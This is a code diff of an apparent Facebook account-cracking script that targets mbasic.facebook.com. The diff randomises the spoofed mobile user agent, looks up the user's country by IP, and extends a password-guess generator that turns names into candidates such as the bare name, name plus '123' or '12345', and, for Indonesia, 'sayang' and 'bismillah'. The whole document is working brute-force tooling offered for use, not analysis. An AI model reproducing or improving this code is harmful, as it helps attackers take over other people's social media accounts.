@@ -52,14 +52,14 @@ def banner():
 \033[0;92m───────────────────────────────────────────────""")
 
 host="https://mbasic.facebook.com"
-ua="Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+ua = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
 ips=None
 try:
 	b=requests.get("https://api.ipify.org").text.strip()
 	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"}).json()["country_name"].lower()
 except:
 	ips=None
-uas="Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+uas = random.choice(["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
 if os.path.exists(".browser"):
 	if os.path.getsize(".browser") !=0:
 		uas=open(".browser").read().strip()
@@ -396,13 +396,16 @@ def generate(text):
 		else:
 			i=i.lower()
 			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i)
 				results.append(i+"123")
 				results.append(i+"12345")
 			else:
+				results.append(i)
 				results.append(i+"123")
 				results.append(i+"12345")
 				if "indonesia" in ips:
 					results.append("sayang")
+					results.append("bismillah")
 	return results
 def methode():
   os.system("clear")
